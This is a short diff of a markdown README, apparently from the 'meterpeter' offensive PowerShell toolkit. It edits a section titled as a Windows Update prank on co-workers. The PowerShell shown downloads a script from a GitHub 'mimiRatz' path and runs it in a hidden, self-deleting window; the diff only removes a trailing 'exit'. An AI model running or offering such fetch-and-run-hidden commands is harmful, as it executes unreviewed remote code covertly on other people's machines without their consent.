@@ -112,7 +112,7 @@ Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papa
 #### Windows Update Prank ( prank your co-workers )
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1" -outfile "FWUprank.ps1"
-Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on";exit
+Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
 ```
 
 ---
